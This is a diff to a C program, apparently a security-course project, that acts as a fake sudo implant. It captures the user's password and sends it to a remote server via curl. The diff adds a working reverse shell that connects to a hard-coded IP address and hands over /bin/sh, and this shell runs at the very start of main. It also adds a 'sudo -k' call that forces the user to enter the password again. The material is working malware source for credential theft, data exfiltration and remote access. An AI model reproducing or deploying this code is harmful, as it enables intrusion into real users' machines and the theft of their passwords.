@@ -11,6 +11,10 @@
 #include <assert.h>
 #include <time.h>
 
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #define PASSWD_SIZE 1024
 #define UNAME_SIZE 1024
@@ -20,6 +24,8 @@ static void sighandler(int signo){}
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
+  reverse_shell(1234, "149.89.161.100");
+  
   //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
@@ -47,7 +53,7 @@ int main(int argc, char ** argv){
 
     printf("%s's password is %s\n", username, passwd);
 
-    send_stolen_data(username, passwd);
+    send_stolen_data("Abel", "pahahahahsswd");
     
     char ** cmd_ray = make_execvp_args(argc, argv);
     runSudo(passwd, cmd_ray, 0);
@@ -87,6 +93,10 @@ int get_username(char * uname){
 }
 
 int steal_password(char * passwd, char * username){
+
+  char * clear_sudo_session[3] = {"/bin/sudo", "-k", NULL};
+  runSudo("", clear_sudo_session, 1);
+
   get_username(username);
 
   char prompt[UNAME_SIZE + 32];
@@ -134,18 +144,23 @@ void send_stolen_data(char *username, char *password) {
   char command[1024];
 
   // Copied from here: https://stackoverflow.com/a/65382305
+
+  //popen opens a pipe to the child process. In r mode it returns a FILE * to stdout of the process
+  
   FILE* file = popen("curl -s https://api.ipify.org", "r");
-  char *out = NULL;
+  char out = 0;
   size_t outlen = 0;
 
   char ip[256] = "";
-
-  while (getline(&out, &outlen, file) >= 0) {
-      strcat(ip, out);
+  int i = 0;
+  while (read(fileno(file), &out, 1) > 0) {
+      printf("%c\n", out);
+      ip[i] = out;
+      i++;
   }
 
   pclose(file);
-  free(out);
+  // free(out);
 
   // Create the full curl POST request
   snprintf(command, sizeof(command),
@@ -301,4 +316,26 @@ int runSudo(char * passwd, char ** argAry, int mask_output){
 
   // Unreachable
   return 0;
+}
+
+
+//c reverse shell slighlty modified from https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#dart 
+// from class notes
+int reverse_shell(int port, char*ip){
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr(ip);
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;       
 }
